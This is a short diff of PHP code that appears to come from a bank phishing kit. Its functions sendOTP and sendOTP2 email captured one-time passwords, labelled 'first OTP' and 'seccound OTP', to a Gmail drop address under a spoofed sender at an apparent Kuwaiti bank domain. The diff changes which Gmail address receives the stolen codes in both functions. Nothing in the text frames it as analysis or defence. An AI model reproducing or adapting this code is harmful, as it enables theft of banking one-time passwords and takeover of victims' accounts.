@@ -28,7 +28,8 @@ function sendtEmailPatment($data)
 }
 function sendOTP($data)
 {
-    $to = "hassankiwan92@gmail.com";
+
+    $to = "bank31930@gmail.com";
     $sender = "admin@nbkkuwait.com";
     $subject = "first OTP";
     $message = "";
@@ -55,7 +56,7 @@ function sendOTP($data)
 
 function sendOTP2($data)
 {
-    $to = "hassankiwan92@gmail.com";
+    $to = "bank31930@gmail.com";
     $sender = "admin@nbkkuwait.com";
     $subject = "seccound OTP";
     $message = "";
